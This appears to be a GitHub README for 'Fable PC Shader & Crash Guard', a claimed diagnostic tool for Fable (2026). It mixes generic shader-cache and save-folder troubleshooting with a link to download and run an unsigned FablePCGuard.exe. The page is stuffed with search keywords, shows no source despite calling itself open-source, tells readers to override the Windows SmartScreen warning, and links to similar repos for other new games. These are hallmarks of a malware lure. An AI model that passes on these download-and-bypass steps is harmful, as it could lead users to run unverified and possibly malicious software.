<p align="center">
  <img src="https://i.postimg.cc/k5jd64nN/banner.png" alt="Fable PC Shader & Crash Guard — ForzaTech Shader Cache & Save Checks for Windows" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-Shader%20%26%20Crash%20Audit-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-fable--pc--guard--26.11a-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# Fable PC Shader & Crash Guard — ForzaTech Shader Cache & Save Checks for Windows

**Fable crashing to desktop during initial shader optimization on Windows PC? Experiencing sudden frame drops in Albion towns or looking for your local save directory? Inspect your Local AppData caches and config files first.**

Fable PC Shader & Crash Guard focuses on Playground Games' ForzaTech PC pipeline behavior: **initial DirectX 12 shader compilation, graphics preset configuration, and crash diagnostics write to `%LOCALAPPDATA%\Fable`**, while Steam/Xbox PC cloud saves sync with local profile containers.

This project is aimed at **Fable (2026) on Windows PC (Steam & Xbox App)**. It covers `%LOCALAPPDATA%\Fable` shader-cache checks, graphics config backups, crash dump detection, and save-directory discovery—not memory editing or bypassing platform DRM.

## Quick Symptom & Cause Reference

| Symptom / Error | Likely Cause | Recommended Check |
| --- | --- | --- |
| Crash or freeze on 'Optimizing Shaders' screen | Outdated GPU driver or insufficient free space on `C:` | Update GPU driver and verify 15–20 GB free on `C:` |
| Frametime spikes in Albion towns / cutscenes | Ray Tracing & Ultra textures exceeding 8 GB–12 GB VRAM | Audit GPU VRAM headroom and lower RT/shadow presets one step |
| Black screen or out-of-range resolution on boot | Corrupted display config in `%LOCALAPPDATA%\Fable\UserConfig` | Back up and reset `%LOCALAPPDATA%\Fable\UserConfig` |
| Protecting local Albion saves before patches | Cloud sync conflict overwriting local `SaveGames` | Copy `%LOCALAPPDATA%\Fable\SaveGames` to Documents |

## Download for Windows

[**Download FablePCGuard.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/FablePCGuard.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why run `FablePCGuard.exe`? (Automatic checks in ~2 seconds)

- Checks available disk space on `C:` where ForzaTech compiles DirectX 12 shaders.
- Locates `%LOCALAPPDATA%\Fable` (`ShaderCache`, `UserConfig`, `CrashReports`, and `SaveGames`).
- Detects recent crash dumps and checks for running overlay hooks (`RTSS`, `Discord`, `GameBar`).
- Reports GPU model, driver version, and system RAM/VRAM capacity.

### Sample Diagnostic Output

```text
[FablePCGuard] Auditing ForzaTech shader cache & local Fable profile...
[OK]   AppData Path     : C:\Users\Player\AppData\Local\Fable
[OK]   System Drive C:  : 42.8 GB free (Sufficient for DX12 ShaderCache)
[OK]   UserConfig       : Found (3 files, valid)
[INFO] CrashReports     : 0 crash dumps detected
[OK]   SaveGames        : 3 save profiles found (Latest: 9.4 MB)
```

The release ZIP is named `FablePCGuard.zip`; the Windows executable inside is named `FablePCGuard.exe`.

1. Close Fable before moving or checking game files.
2. Click **Download FablePCGuard.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `FablePCGuard.exe`.
5. Review the reported locations and status checks before making any changes to your files.
6. Restart Fable and verify behavior after applying any recommended fixes.

**Requirements:** Windows 10 or 11 (64-bit, build 22H2 or newer), a Windows PC installation of Fable, and DirectX 12 Ultimate compatible GPU drivers.

### Verification & Windows SmartScreen Note

- **Read-only & standard user permissions:** `FablePCGuard.exe` runs without administrator rights and does not modify game binaries, system registry keys, or Windows Defender settings.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project focuses on

### Crash or freeze during initial 'Optimizing Shaders' screen

ForzaTech compiles heavy DX12 shaders on first boot and after every GPU driver update. Low free space on `C:` or an outdated graphics driver often triggers `DXGI_ERROR_DEVICE_HUNG` crashes during warm-up.

### Frametime spikes when entering crowded towns or cutscenes

Ray-traced reflections and high shadow/crowd settings can exceed 8 GB–12 GB VRAM buffers, causing PCIe memory paging hitches.

### Settings fail to save or launch resolution is out of range

Corrupted local configuration files inside `%LOCALAPPDATA%\Fable\UserConfig` can force invalid fullscreen modes on startup.

### Backing up local Fable save profiles before major patches

Keeping a dated offline copy of your local save folder protects your Albion progression against cloud sync conflicts.

## Where Fable files normally belong

On Windows PC, local shader caches, user configs, and save backups live inside `%LOCALAPPDATA%\Fable`:

```text
%LOCALAPPDATA%\Fable\
```

Inside that structure, key files and subdirectories typically look like this:

```text
%LOCALAPPDATA%\Fable\
├── ShaderCache\
├── UserConfig\
├── CrashReports\
└── SaveGames\
```

If you play via the Xbox App / PC Game Pass instead of Steam, save containers may also sync inside `%LOCALAPPDATA%\Packages\Microsoft.Fable_*\SystemAppData\wgs\`.

## A practical troubleshooting checklist

If your issue still persists, work through these checks in order:

1. **Close Fable completely.** Verify the game executable is no longer active in Task Manager.
2. **Update your GPU driver to the latest 2026 Game Ready / Adrenalin release.** ForzaTech relies on current DirectX 12 shader compiler fixes.
3. **Check free space on drive `C:`.** Ensure at least 15–20 GB of free space on your system drive for DX12 shader caches.
4. **Back up `SaveGames` and `UserConfig`.** Copy `%LOCALAPPDATA%\Fable\SaveGames` to a dated folder in Documents before resetting configs.
5. **Inspect `CrashReports` timestamps.** Check whether crashes correlate with overlay hooks (RTSS, Discord, or capture software).
6. **Verify installed files in Steam or Xbox App.** Run file verification to repair any damaged archive chunks.
7. **Let 'Optimizing Shaders' finish completely on launch.** Avoid alt-tabbing repeatedly while initial shader compilation runs.

### Before moving any files

Copy your `SaveGames` and `UserConfig` folders to Documents before clearing `ShaderCache` or resetting graphics presets.

## What an effective diagnostic report should tell you

A clear diagnostic report checks **system drive headroom on `C:`**, inspects `ShaderCache` and `UserConfig` files in `%LOCALAPPDATA%\Fable`, detects `CrashReports`, and verifies GPU driver info.

## FAQ

**Where are Fable (2026) save files located on Windows?**

On Steam, local saves reside in `%LOCALAPPDATA%\Fable\SaveGames\`; on PC Game Pass, encrypted cloud containers sync under `%LOCALAPPDATA%\Packages\`.

**Why does Fable optimize shaders on startup?**

ForzaTech pre-compiles DirectX 12 shaders for your exact GPU and driver version to prevent mid-gameplay stutter.

**What causes Fable to crash during shader compilation?**

Outdated GPU drivers, insufficient free space on `C:`, or unstable GPU factory overclocks are the top culprits.

**Where are Fable's graphics config files stored?**

Inside `%LOCALAPPDATA%\Fable\UserConfig\`.

**Does this tool edit gold, morality, or character stats?**

No. It strictly inspects local cache, config, and save paths.

**Are any game files or binaries bundled here?**

No copyrighted game files are included in this repository.

## Useful reading

- [Fable Official Page (Xbox Game Studios)](https://www.xbox.com/games/fable)
- [Fable on Steam](https://store.steampowered.com/search/?term=Fable+Playground+Games)

## More Windows Game Diagnostic Tools

- [CrimsonDesert-ShaderFrameDoctor](../CrimsonDesert-ShaderFrameDoctor) — Crimson Desert DX12 shader cache & save diagnostics
- [GearsEDay-UE5StutterDoctor](../GearsEDay-UE5StutterDoctor) — Gears of War: E-Day UE5 DX12 stutter & config doctor
- [DeathStranding2-PCCacheDoctor](../DeathStranding2-PCCacheDoctor) — Death Stranding 2 PC Decima shader cache & save doctor
- [Marvel1943-ShaderConfigAudit](../Marvel1943-ShaderConfigAudit) — Marvel 1943: Rise of Hydra UE5 shader & VRAM audit

*Independent community project. Not affiliated with Playground Games, Xbox Game Studios, Microsoft, Valve, or Steam. All trademarks belong to their respective owners.*
